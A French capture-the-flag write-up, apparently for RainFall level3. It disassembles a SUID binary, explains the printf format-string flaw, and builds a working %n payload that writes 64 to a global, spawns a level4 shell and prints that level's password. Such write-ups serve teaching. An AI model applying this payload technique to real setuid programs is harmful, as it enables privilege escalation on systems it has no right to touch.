## 1: Analyse

### A: C'est quoi mon binaire?

  ```shell
  # On se connecte si c'est pas déja fait via le level2
  $ ssh level3@127.0.0.1 -p 4242
        _____       _       ______    _ _
      |  __ \     (_)     |  ____|  | | |
      | |__) |__ _ _ _ __ | |__ __ _| | |
      |  _  /  _` | | '_ \|  __/ _` | | |
      | | \ \ (_| | | | | | | | (_| | | |
      |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|

                    Good luck & Have fun

      To start, ssh with level0/level0 on 10.0.2.15:4242

  # On rentre le password
  level3@127.0.0.1's password: 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
  level3@127.0.0.1's password:
    GCC stack protector support:            Enabled
    Strict user copy checks:                Disabled
    Restrict /dev/mem access:               Enabled
    Restrict /dev/kmem access:              Enabled
    grsecurity / PaX: No GRKERNSEC
    Kernel Heap Hardening: No KERNHEAP
  System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
  RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
  No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level3/level3
  level3@RainFall:~$
  
  # On regarde ce qu'on a
  level3@RainFall:~$ ls -la
    total 17
    dr-xr-x---+ 1 level3 level3   80 Mar  6  2016 .
    dr-x--x--x  1 root   root    340 Sep 23  2015 ..
    -rw-r--r--  1 level3 level3  220 Apr  3  2012 .bash_logout
    -rw-r--r--  1 level3 level3 3530 Sep 23  2015 .bashrc
    -rwsr-s---+ 1 level4 users  5366 Mar  6  2016 level3
    -rw-r--r--+ 1 level3 level3   65 Sep 23  2015 .pass
    -rw-r--r--  1 level3 level3  675 Apr  3  2012 .profile

  # On teste les arguments
  level3@RainFall:~$ ./level3
    test
    test
  level3@RainFall:~$ ./level3 test test
    test test
    test test
  level3@RainFall:~$ ./level3
      STRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUE
      STRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUE
  level3@RainFall:~$ ./level3
      STRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUE    STRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUE    STRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUE    STRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUE    STRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUE    STRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUE
      STRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUE    STRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUE    STRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUE    STRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUE    STRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUE    STRING SUPER LOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOOONGUE
  ```
  * On a un binaire appartenant a level3 dans le home avec les droits SUID...
  * ... qui demande un input ...
  * ... qui print l'input ...
  * ... qui segfault pas :/ aïe... ouvrons lui le ventre


### B: On l'ouvre avec gdb
  * On va dans tmp pour lancer avec peda qu'on a copié avec le setup.sh
  ```shell
    level3@RainFall:~$ cd /tmp
  ```

  * On lance gdb avec notre binaire
  ```shell
    level3@RainFall:/tmp$ gdb ~/level3
      [...]
      Reading symbols from /home/user/level3/level3...(no debugging symbols found)...done.
  ```

  * Qu'est-ce qu'on a comme fonctions?
  ```shell
    gdb-peda$ info function
      All defined functions:

      Non-debugging symbols:
      0x08048344  _init
      0x08048390  printf
      0x08048390  printf@plt
      0x080483a0  fgets
      0x080483a0  fgets@plt
      0x080483b0  fwrite
      0x080483b0  fwrite@plt
      0x080483c0  system
      0x080483c0  system@plt
      0x080483d0  __gmon_start__
      0x080483d0  __gmon_start__@plt
      0x080483e0  __libc_start_main
      0x080483e0  __libc_start_main@plt
      0x080483f0  _start
      0x08048420  __do_global_dtors_aux
      0x08048480  frame_dummy # Encore toi??
      0x080484a4  v           # Func v
      0x0804851a  main        # Func main comme d'hab
      0x08048530  __libc_csu_init
      0x080485a0  __libc_csu_fini
      0x080485a2  __i686.get_pc_thunk.bx
      0x080485b0  __do_global_ctors_aux
      0x080485dc  _fini
  ```

  * Commandes lancées pendant l'analyse du binaire ci-dessous
  ```shell
    gdb-peda$ x/s 0x8049860
      0x8049860 <stdin@@GLIBC_2.0>:	 ""

    gdb-peda$ x/s 0x804988c
      0x804988c <m>:	 "" # Notre première globale

    gdb-peda$ x/s 0x8049880
      0x8049880 <stdout@@GLIBC_2.0>:	 ""

    gdb-peda$ x/s 0x8048600
      0x8048600:	 "Wait what?!\n"

    gdb-peda$ x/s 0x804860d
      0x804860d:	 "/bin/sh"
  ```

  * On disassemble main pour regarder le code
  ```shell
    gdb-peda$ pdisas main
    Dump of assembler code for function main:
    # Comme dans le level2, sauf qu'on call v à la place
    0x0804851a <+0>:	push   ebp
    0x0804851b <+1>:	mov    ebp,esp
    0x0804851d <+3>:	and    esp,0xfffffff0
    0x08048520 <+6>:	call   0x80484a4 <v>
    0x08048525 <+11>:	leave
    0x08048526 <+12>:	ret
    End of assembler dump.
  ```

  * Ok, donc on a un main qui call v et return. Regardons v.
  ```shell
    gdb-peda$ pdisas p
      Dump of assembler code for function v:
      # Comme d'habitude, on initialise mais on alloue ce coup-ci 536 octets.
      0x080484a4 <+0>:	push   ebp
      0x080484a5 <+1>:	mov    ebp,esp
      0x080484a7 <+3>:	sub    esp,0x218  # 0x218 = 536

      # Call fgets(buffer[520], 512, stdin)
      0x080484ad <+9>:	mov    eax,ds:0x8049860           # On met stdin dans eax
      0x080484b2 <+14>:	mov    DWORD PTR [esp+0x8],eax    # On push eax (stdin) sur la stack
      0x080484b6 <+18>:	mov    DWORD PTR [esp+0x4],0x200  # On push 512 sur la stack
      0x080484be <+26>:	lea    eax,[ebp-0x208]            # On déplace eax sur EBP - 520
      0x080484c4 <+32>:	mov    DWORD PTR [esp],eax        # On push eax (EBP - 520) sur la stack
      0x080484c7 <+35>:	call   0x80483a0 <fgets@plt>      # On call fgets avec ces arguments

      # Call printf(buffer[520])
      0x080484cc <+40>:	lea    eax,[ebp-0x208]        # On déplace eax sur le debut de notre buffer[520]
      0x080484d2 <+46>:	mov    DWORD PTR [esp],eax    # On push eax (buffer[520]) sur la stack    
      0x080484d5 <+49>:	call   0x8048390 <printf@plt> # On call printf avec notre input

      # If gobale m != 64 jump to return
      0x080484da <+54>:	mov    eax,ds:0x804988c   # On met la globale m dans eax
      0x080484df <+59>:	cmp    eax,0x40           # On compare la globale m a 64
      0x080484e2 <+62>:	jne    0x8048518 <v+116>  # Si m != 64 jump to v + 116 (return)

      # Sinon on call fwrite("Wait what?!\n", 1, 12, stdout)
      0x080484e4 <+64>:	mov    eax,ds:0x8049880         # On met stdout dans eax
      0x080484e9 <+69>:	mov    edx,eax                  # On met eax (stdout) dans edx
      0x080484eb <+71>:	mov    eax,0x8048600            # On met "Wait what?!\n" dans eax
      0x080484f0 <+76>:	mov    DWORD PTR [esp+0xc],edx  # On push edx (stdout) sur la stack
      0x080484f4 <+80>:	mov    DWORD PTR [esp+0x8],0xc  # On push 12 sur la stack
      0x080484fc <+88>:	mov    DWORD PTR [esp+0x4],0x1  # On push 1 sur la stack
      0x08048504 <+96>:	mov    DWORD PTR [esp],eax      # On push eax ("Wait what?!\n") sur la stack
      0x08048507 <+99>:	call   0x80483b0 <fwrite@plt>   # On call fwrite avec tout ca

      # On call system("/bin/sh")
      0x0804850c <+104>:	mov    DWORD PTR [esp],0x804860d  # On push "/bin/sh" sur la stack
      0x08048513 <+111>:	call   0x80483c0 <system@plt>     # On lance le shell

      # Return
      0x08048518 <+116>:	leave
      0x08048519 <+117>:	ret
      End of assembler dump.
  ```

  * On voit que v prend un input de manière plus sécurisée que gets (avec une taille qui débordera pas sur l'EIP)
  * En revanche il passe directement l'input a printf (faaaaaillle)
  * Si la globale m est != 64 return
  * Sinon, on print "Wait what?!\n" et on lance un shell.

  * Bon, on sait qu'on doit réussir a changer cette variable m() pour pouvoir exécuter le shell, et on va voir qu'on a une faille sur l'utilisation du printf

## 2: Comportement
> Une fois recomposé, on comprend que le main call juste v.\
> v, quand à elle, fait un fgets (sécurisé), un printf de l'input(pas sécurisé), et lance un shell si la globale m a une certaine valeur.

## 3: Exploit

### A: Explication

> Bienvenue dans l'exploit de la format string!\
> Cet exploit part du fait que l'on utilise un input comme paramètre direct de printf, or:\
> 1: Si l'on met des "%s" dans l'input, printf va lire des paramêtres dans la stack de la fonction qui call qui ne sont pas là. Et pour chaque %s dans l'input, il va remonter de plus en plus loin. Je rappelle qu'une fonction vient prendre ses paramêtres au fond de la stack de la fonction appelante. On peut ainsi lire la mémoire.
> 2: Lire la mémoire c'est bien beau, mais printf peut aussi ECRIRE dans la mémoire. Connaissez-vous le %n ? Et bien cette fonctionnalité va écrire le nombre de caractères que printf a écrit depuis le début de son print à l'addresse que vous allez lui passer en paramètre.\
> Et c'est justement ce que l'on cherche ici. On veut que printf écrive 64 dans la globale m, dont on a l'addresse. Si on relit bien le 2, printf devra alors tomber sur un parametre contenant l'addresse de m au moment où il aura imprimé 64 char.\

> ON VA DONC chercher au bout de combien de %s on retombe sur notre buffer dans la stack de la fonction v. Ensuite, on saura combien de chars imprimer avant nos %s puis notre %n pour lire l'addresse de m que l'on aura mis au debut de notre string.

### B: Creation de l'exploit

* Il nous faut donc: l'adresse de m, à partir de combien de parametres on va lire le debut de notre string, et c'est tout

```shell
  # Addresse de m (vu pendant l'analyse)
  gdb-peda$ x/s 0x804988c
    0x804988c <m>:	 ""

  # On teste au bout de combien de paramètres on retombe sur nos AAAA
  level3@RainFall:/tmp$ echo 'AAAA%x.%x.%x.%x.%x' | ~/level3
    AAAA200.b7fd1ac0.b7ff37d0.41414141.252e7825
  # On voit ici que l'on tombe sur le 4ème paramètre. Ce paramêtre sera notre %n
```

* On a donc tous les prérequis. En transformant en little indian l'addresse de m(\x8c\x98\x04\08), on va pouvoir construire la string suivante:

```shell
  level3@RainFall:/tmp$ python -c 'print "\x8c\x98\x04\08%1$60d%4$n"' > pattern3
```
* La syntaxe "%4$n" Veut dire qu'on prend le 4eme parametre (évite la répétition de random %)
* La syntaxe "%1$60d" veut dire qu'on met in padding de 60 avant notre premier parametre
* Donc 60 + les 4 de l'addresse, ca nous fait bien 64. Et le 4eme paramètre sera l'endroit où l'on stockera ce nombre

```shell
level3@RainFall:/tmp$ cat /tmp/pattern3 - | ~/level3
  �                                                         512
  Wait what?!
whoami
  level4
cat /home/user/level4/.pass
  b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
